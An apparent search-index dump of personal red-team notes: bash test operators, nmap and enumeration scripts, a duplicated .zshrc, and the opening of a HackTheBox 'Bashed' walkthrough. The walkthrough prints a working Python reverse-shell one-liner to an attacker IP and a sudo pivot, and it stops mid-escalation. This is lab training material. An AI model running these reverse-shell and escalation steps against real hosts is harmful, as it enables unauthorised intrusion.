STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission Nmap All Ports Scan Script Running chmod +x nmap_all_ports.sh ./nmap_all_ports.sh 127 .0.0.1 nmap_all_ports.sh #!/bin/bash if [ $# -eq 0 ] || [ $1 = \"-h\" ] || [ $1 = \"--help\" ] then echo \"Usage: $0 <HOST>\" exit else ports = $( nmap -p- --min-rate 1000 $1 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) if [ -z $ports ] then echo \"No open port!\" exit else echo \"Opening port: $ports \" nmap -sC -sV -p $ports $1 fi fi","title":"Arguments and If Else"},{"location":"red-teaming/unix-system/scripting.html#loops-and-functions","text":"Loops for var-name in <list> do <action to perform> done while [ <some test> ] do <perform an action> done Functions function function_name { commands... } function_name () { commands... }","title":"Loops and Functions"},{"location":"red-teaming/unix-system/scripting.html#auto-enum-script","text":"Running chmod +x auto_enum.sh ./auto_enum.sh 127 .0.0.1 auto_enum.sh #!/bin/bash RED = '\\033[0;31m' YELLOW = '\\033[0;33m' GREEN = '\\033[0;32m' NC = '\\033[0m' origIFS = \" ${ IFS } \" if [ -z $1 ] ; then echo \"Usage: $0 <HOST>\" exit else host = $1 ports = $2 service = $3 fi enum_all_port () { printf \"\\n ${ YELLOW } Scanning openning port ...\\n ${ NC } \" if [ -z $ports ] ; then ports = $( nmap -sS -p- --min-rate 1000 $host | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) fi if [ -z $ports ] ; then printf \" ${ RED } [-] Found no openning port! ${ NC } \" exit else printf \" ${ GREEN } [+] Openning ports: $ports \\n ${ NC } \" array_ports = $( echo $ports | tr ',' '\\n' ) fi } enum_open_service () { printf \"\\n ${ YELLOW } ===============================services===============================\\n ${ NC } \" echo \"nmap -sC -sV -Pn $1 -p $2 \" nmap -sC -sV $host -p $ports } enum_smtp_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"nmap $host -p $port -Pn --script=smtp-*\" nmap $host -p $port --script = smtp-* } enum_web_service () { printf \"\\n ${ YELLOW } =============================== $url ===============================\\n ${ NC } \" printf \"\\n ${ GREEN } [+] Files and directories\\n ${ NC } \" echo \"gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt\" gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt printf \"\\n ${ GREEN } [+] All URLs\\n ${ NC } \" curl -k $url : $port -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' } enum_smb_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"smbmap -H $host \" smbmap -H $host echo \"smbclient -L $host \" smbclient -NL $host } recon () { if [ -z $service ] ; then for port in $array_ports ; do if [ $port = \"25\" ] ; then enum_smtp_service $host $port elif [ $port = \"80\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $port = \"443\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $port = \"445\" ] ; then enum_smb_service $host $port fi done else port = $ports if [ $service = \"smtp\" ] ; then enum_smtp_service $host $port elif [ $service = \"http\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $service = \"https\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $service = \"smb\" ] ; then enum_smb_service $host $port fi fi } main () { enum_all_port $host $ports enum_open_service $host $ports recon $array_ports $service } main","title":"Auto Enum Script"},{"location":"red-teaming/unix-system/services.html","text":"Basic Services Running services Checking running services sudo ss -antlp Checking all available services systemctl list-unit-files SSH Service sudo systemctl start ssh SSH service start automatically at boot time. sudo systemctl enable ssh Web Service Apache2 sudo systemctl start apache2 Python python3 -m http.server 80 python -m SimpleHTTPServer 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 HTTP service start automatically at boot time. sudo systemctl enable apache2","title":"Services"},{"location":"red-teaming/unix-system/services.html#basic-services","text":"","title":"Basic Services"},{"location":"red-teaming/unix-system/services.html#running-services","text":"Checking running services sudo ss -antlp Checking all available services systemctl list-unit-files","title":"Running services"},{"location":"red-teaming/unix-system/services.html#ssh-service","text":"sudo systemctl start ssh SSH service start automatically at boot time. sudo systemctl enable ssh","title":"SSH Service"},{"location":"red-teaming/unix-system/services.html#web-service","text":"Apache2 sudo systemctl start apache2 Python python3 -m http.server 80 python -m SimpleHTTPServer 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 HTTP service start automatically at boot time. sudo systemctl enable apache2","title":"Web Service"},{"location":"red-teaming/unix-system/terminal.html","text":"Terminal Bash Environment echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Set an environment variable export ip = 192 .168.11.131 ping $ip nmap $ip All environment variables env History Re-run the first command !1 Repeats the last command !! Edit terminal Manual Alias alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' .zshrc # ~/.zshrc file for zsh interactive shells. # see /usr/share/doc/zsh/examples/zshrc for examples setopt autocd # change directory just by typing its name #setopt correct # auto correct mistakes setopt interactivecomments # allow comments in interactive mode setopt magicequalsubst # enable filename expansion for arguments of the form \u2018anything=expression\u2019 setopt nonomatch # hide error message if there is no match for the pattern setopt notify # report the status of background jobs immediately setopt numericglobsort # sort filenames numerically when it makes sense setopt promptsubst # enable command substitution in prompt WORDCHARS = ${ WORDCHARS // \\/ } # Don't consider certain characters part of the word # hide EOL sign ('%') PROMPT_EOL_MARK = \"\" # configure key keybindings bindkey -e # emacs key bindings bindkey ' ' magic-space # do history expansion on space bindkey '^[[3;5~' kill-word # ctrl + Supr bindkey '^[[3~' delete-char # delete bindkey '^[[1;5C' forward-word # ctrl + -> bindkey '^[[1;5D' backward-word # ctrl + <- bindkey '^[[5~' beginning-of-buffer-or-history # page up bindkey '^[[6~' end-of-buffer-or-history # page down bindkey '^[[H' beginning-of-line # home bindkey '^[[F' end-of-line # end bindkey '^[[Z' undo # shift + tab undo last action # enable completion features autoload -Uz compinit compinit -d ~/.cache/zcompdump zstyle ':completion:*:*:*:*:*' menu select zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # case insensitive tab completion # History configurations HISTFILE = ~/.zsh_history HISTSIZE = 1000 SAVEHIST = 2000 setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE setopt hist_ignore_dups # ignore duplicated commands history list setopt hist_ignore_space # ignore commands that start with space setopt hist_verify # show command with history expansion to user before running it #setopt share_history # share command history data # force zsh to show the complete history alias history = \"history 0\" # make less more friendly for non-text input files, see lesspipe(1) #[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \" ${ debian_chroot :- } \" ] && [ -r /etc/debian_chroot ] ; then debian_chroot = $( cat /etc/debian_chroot ) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \" $TERM \" in xterm-color | *-256color ) color_prompt = yes ;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt force_color_prompt = yes if [ -n \" $force_color_prompt \" ] ; then if [ -x /usr/bin/tput ] && tput setaf 1 > & /dev/null ; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt = yes else color_prompt = fi fi alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' alias mbsf = \"sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf\" if [ \" $color_prompt \" = yes ] ; then PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' #PROMPT=$'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}%n%(#.\ud83d\udc80.\u327f)%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}]\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' RPROMPT = $'%(?.. %? %F{red}%B\u2a2f%b%F{reset})%(1j. %j %F{yellow}%B\u2699%b%F{reset}.)' # enable syntax-highlighting if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && [ \" $color_prompt \" = yes ] ; then . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ZSH_HIGHLIGHT_HIGHLIGHTERS =( main brackets pattern ) ZSH_HIGHLIGHT_STYLES [ default ]= none ZSH_HIGHLIGHT_STYLES [ unknown-token ]= fg = red,bold ZSH_HIGHLIGHT_STYLES [ reserved-word ]= fg = cyan,bold ZSH_HIGHLIGHT_STYLES [ suffix-alias ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ global-alias ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ precommand ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ commandseparator ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ autodirectory ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ path ]= underline ZSH_HIGHLIGHT_STYLES [ path_pathseparator ]= ZSH_HIGHLIGHT_STYLES [ path_prefix_pathseparator ]= ZSH_HIGHLIGHT_STYLES [ globbing ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ history-expansion ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ command-substitution ]= none ZSH_HIGHLIGHT_STYLES [ command-substitution-delimiter ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ process-substitution ]= none ZSH_HIGHLIGHT_STYLES [ process-substitution-delimiter ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ single-hyphen-option ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ double-hyphen-option ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-quoted-argument ]= none ZSH_HIGHLIGHT_STYLES [ back-quoted-argument-delimiter ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ single-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ double-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ dollar-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ rc-quote ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ dollar-double-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-double-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-dollar-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ assign ]= none ZSH_HIGHLIGHT_STYLES [ redirection ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ comment ]= fg = black,bold ZSH_HIGHLIGHT_STYLES [ named-fd ]= none ZSH_HIGHLIGHT_STYLES [ numeric-fd ]= none ZSH_HIGHLIGHT_STYLES [ arg0 ]= fg = green ZSH_HIGHLIGHT_STYLES [ bracket-error ]= fg = red,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-1 ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-2 ]= fg = green,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-3 ]= fg = magenta,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-4 ]= fg = yellow,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-5 ]= fg = cyan,bold ZSH_HIGHLIGHT_STYLES [ cursor-matchingbracket ]= standout fi else PROMPT = '${debian_chroot:+($debian_chroot)}%n@%m:%~%# ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \" $TERM \" in xterm* | rxvt* ) TERM_TITLE = $'\\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\\a' ;; * ) ;; esac new_line_before_prompt = yes precmd () { # Print the previously configured title print -Pnr -- \" $TERM_TITLE \" # Print a new line before the prompt, but only if it is not the first line if [ \" $new_line_before_prompt \" = yes ] ; then if [ -z \" $_NEW_LINE_BEFORE_PROMPT \" ] ; then _NEW_LINE_BEFORE_PROMPT = 1 else print \"\" fi fi } # enable color support of ls, less and man, and also add handy aliases if [ -x /usr/bin/dircolors ] ; then test -r ~/.dircolors && eval \" $( dircolors -b ~/.dircolors ) \" || eval \" $( dircolors -b ) \" alias ls = 'ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' alias grep = 'grep --color=auto' alias fgrep = 'fgrep --color=auto' alias egrep = 'egrep --color=auto' alias diff = 'diff --color=auto' alias ip = 'ip --color=auto' export LESS_TERMCAP_mb = $'\\E[1;31m' # begin blink export LESS_TERMCAP_md = $'\\E[1;36m' # begin bold export LESS_TERMCAP_me = $'\\E[0m' # reset bold/blink export LESS_TERMCAP_so = $'\\E[01;33m' # begin reverse video export LESS_TERMCAP_se = $'\\E[0m' # reset reverse video export LESS_TERMCAP_us = $'\\E[1;32m' # begin underline export LESS_TERMCAP_ue = $'\\E[0m' # reset underline # Take advantage of $LS_COLORS for completion as well zstyle ':completion:*' list-colors \" ${ (s.:.)LS_COLORS } \" fi # some more ls aliases alias ll = 'ls -l' alias la = 'ls -A' alias l = 'ls -CF' # enable auto-suggestions based on the history if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ] ; then . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh # change suggestion color ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE = 'fg=#999' fi","title":"Terminal"},{"location":"red-teaming/unix-system/terminal.html#terminal","text":"","title":"Terminal"},{"location":"red-teaming/unix-system/terminal.html#bash-environment","text":"echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","title":"Bash Environment"},{"location":"red-teaming/unix-system/terminal.html#set-an-environment-variable","text":"export ip = 192 .168.11.131 ping $ip nmap $ip","title":"Set an environment variable"},{"location":"red-teaming/unix-system/terminal.html#all-environment-variables","text":"env","title":"All environment variables"},{"location":"red-teaming/unix-system/terminal.html#history","text":"","title":"History"},{"location":"red-teaming/unix-system/terminal.html#re-run-the-first-command","text":"!1","title":"Re-run the first command"},{"location":"red-teaming/unix-system/terminal.html#repeats-the-last-command","text":"!!","title":"Repeats the last command"},{"location":"red-teaming/unix-system/terminal.html#edit-terminal","text":"Manual Alias alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' .zshrc # ~/.zshrc file for zsh interactive shells. # see /usr/share/doc/zsh/examples/zshrc for examples setopt autocd # change directory just by typing its name #setopt correct # auto correct mistakes setopt interactivecomments # allow comments in interactive mode setopt magicequalsubst # enable filename expansion for arguments of the form \u2018anything=expression\u2019 setopt nonomatch # hide error message if there is no match for the pattern setopt notify # report the status of background jobs immediately setopt numericglobsort # sort filenames numerically when it makes sense setopt promptsubst # enable command substitution in prompt WORDCHARS = ${ WORDCHARS // \\/ } # Don't consider certain characters part of the word # hide EOL sign ('%') PROMPT_EOL_MARK = \"\" # configure key keybindings bindkey -e # emacs key bindings bindkey ' ' magic-space # do history expansion on space bindkey '^[[3;5~' kill-word # ctrl + Supr bindkey '^[[3~' delete-char # delete bindkey '^[[1;5C' forward-word # ctrl + -> bindkey '^[[1;5D' backward-word # ctrl + <- bindkey '^[[5~' beginning-of-buffer-or-history # page up bindkey '^[[6~' end-of-buffer-or-history # page down bindkey '^[[H' beginning-of-line # home bindkey '^[[F' end-of-line # end bindkey '^[[Z' undo # shift + tab undo last action # enable completion features autoload -Uz compinit compinit -d ~/.cache/zcompdump zstyle ':completion:*:*:*:*:*' menu select zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # case insensitive tab completion # History configurations HISTFILE = ~/.zsh_history HISTSIZE = 1000 SAVEHIST = 2000 setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE setopt hist_ignore_dups # ignore duplicated commands history list setopt hist_ignore_space # ignore commands that start with space setopt hist_verify # show command with history expansion to user before running it #setopt share_history # share command history data # force zsh to show the complete history alias history = \"history 0\" # make less more friendly for non-text input files, see lesspipe(1) #[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \" ${ debian_chroot :- } \" ] && [ -r /etc/debian_chroot ] ; then debian_chroot = $( cat /etc/debian_chroot ) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \" $TERM \" in xterm-color | *-256color ) color_prompt = yes ;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt force_color_prompt = yes if [ -n \" $force_color_prompt \" ] ; then if [ -x /usr/bin/tput ] && tput setaf 1 > & /dev/null ; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt = yes else color_prompt = fi fi alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' alias mbsf = \"sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf\" if [ \" $color_prompt \" = yes ] ; then PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' #PROMPT=$'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}%n%(#.\ud83d\udc80.\u327f)%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}]\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' RPROMPT = $'%(?.. %? %F{red}%B\u2a2f%b%F{reset})%(1j. %j %F{yellow}%B\u2699%b%F{reset}.)' # enable syntax-highlighting if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && [ \" $color_prompt \" = yes ] ; then . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ZSH_HIGHLIGHT_HIGHLIGHTERS =( main brackets pattern ) ZSH_HIGHLIGHT_STYLES [ default ]= none ZSH_HIGHLIGHT_STYLES [ unknown-token ]= fg = red,bold ZSH_HIGHLIGHT_STYLES [ reserved-word ]= fg = cyan,bold ZSH_HIGHLIGHT_STYLES [ suffix-alias ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ global-alias ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ precommand ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ commandseparator ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ autodirectory ]= fg = green,underline ZSH_HIGHLIGHT_STYLES [ path ]= underline ZSH_HIGHLIGHT_STYLES [ path_pathseparator ]= ZSH_HIGHLIGHT_STYLES [ path_prefix_pathseparator ]= ZSH_HIGHLIGHT_STYLES [ globbing ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ history-expansion ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ command-substitution ]= none ZSH_HIGHLIGHT_STYLES [ command-substitution-delimiter ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ process-substitution ]= none ZSH_HIGHLIGHT_STYLES [ process-substitution-delimiter ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ single-hyphen-option ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ double-hyphen-option ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-quoted-argument ]= none ZSH_HIGHLIGHT_STYLES [ back-quoted-argument-delimiter ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ single-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ double-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ dollar-quoted-argument ]= fg = yellow ZSH_HIGHLIGHT_STYLES [ rc-quote ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ dollar-double-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-double-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ back-dollar-quoted-argument ]= fg = magenta ZSH_HIGHLIGHT_STYLES [ assign ]= none ZSH_HIGHLIGHT_STYLES [ redirection ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ comment ]= fg = black,bold ZSH_HIGHLIGHT_STYLES [ named-fd ]= none ZSH_HIGHLIGHT_STYLES [ numeric-fd ]= none ZSH_HIGHLIGHT_STYLES [ arg0 ]= fg = green ZSH_HIGHLIGHT_STYLES [ bracket-error ]= fg = red,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-1 ]= fg = blue,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-2 ]= fg = green,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-3 ]= fg = magenta,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-4 ]= fg = yellow,bold ZSH_HIGHLIGHT_STYLES [ bracket-level-5 ]= fg = cyan,bold ZSH_HIGHLIGHT_STYLES [ cursor-matchingbracket ]= standout fi else PROMPT = '${debian_chroot:+($debian_chroot)}%n@%m:%~%# ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \" $TERM \" in xterm* | rxvt* ) TERM_TITLE = $'\\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\\a' ;; * ) ;; esac new_line_before_prompt = yes precmd () { # Print the previously configured title print -Pnr -- \" $TERM_TITLE \" # Print a new line before the prompt, but only if it is not the first line if [ \" $new_line_before_prompt \" = yes ] ; then if [ -z \" $_NEW_LINE_BEFORE_PROMPT \" ] ; then _NEW_LINE_BEFORE_PROMPT = 1 else print \"\" fi fi } # enable color support of ls, less and man, and also add handy aliases if [ -x /usr/bin/dircolors ] ; then test -r ~/.dircolors && eval \" $( dircolors -b ~/.dircolors ) \" || eval \" $( dircolors -b ) \" alias ls = 'ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' alias grep = 'grep --color=auto' alias fgrep = 'fgrep --color=auto' alias egrep = 'egrep --color=auto' alias diff = 'diff --color=auto' alias ip = 'ip --color=auto' export LESS_TERMCAP_mb = $'\\E[1;31m' # begin blink export LESS_TERMCAP_md = $'\\E[1;36m' # begin bold export LESS_TERMCAP_me = $'\\E[0m' # reset bold/blink export LESS_TERMCAP_so = $'\\E[01;33m' # begin reverse video export LESS_TERMCAP_se = $'\\E[0m' # reset reverse video export LESS_TERMCAP_us = $'\\E[1;32m' # begin underline export LESS_TERMCAP_ue = $'\\E[0m' # reset underline # Take advantage of $LS_COLORS for completion as well zstyle ':completion:*' list-colors \" ${ (s.:.)LS_COLORS } \" fi # some more ls aliases alias ll = 'ls -l' alias la = 'ls -A' alias l = 'ls -CF' # enable auto-suggestions based on the history if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ] ; then . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh # change suggestion color ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE = 'fg=#999' fi","title":"Edit terminal"},{"location":"walkthrough/index.html","text":"__ LeeCyberSec __ Email: tuvn@protonmail.com https://github.com/leecybersec/walkthrough","title":"__index__"},{"location":"walkthrough/index.html#__leecybersec__","text":"Email: tuvn@protonmail.com https://github.com/leecybersec/walkthrough","title":"__LeeCyberSec__"},{"location":"walkthrough/hackthebox/Bashed/index.html","text":"HackTheBox Bashed Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.68 [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.68 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 09:54 +07 Nmap scan report for 10.10.10.68 Host is up (0.25s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel's Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds ### Web Enumeration (80) ############################ Apache httpd 2.4.18 List of the hidden using gobuster and I try to enum in the hidden url. [+] Files and directories gobuster dir -k -u http://10.10.10.68:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /images (Status: 301) [Size: 311] [--> http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/] /php (Status: 301) [Size: 308] [--> http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--> http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--> http://10.10.10.68/js/] At uri /dev , I got 2 file which is phpbash command shell. Foothold phpbash execute shell At url http://10.10.10.68/dev/phpbash.php , I try some reverse shell with bash , nc but it's not work. When I run python reverse shell and I got it. python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' At listener, I got reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.2:29.2]~/walkthrough/hackthebox/bashed \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 34342 www-data@bashed:/var/www/html/dev$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Sudo Access After running linpeas.sh , I got the sudo access to run command with scriptmanager's permission without password. www-data@bashed:/var/www/html/dev$ sudo -l sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL Let's run /bin/bash to get the shell. www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash sudo -u scriptmanager /bin/bash scriptmanager@bashed:/var/www/html/dev$ id id uid=1001(scriptmanager) gid=1001(scriptmanager) 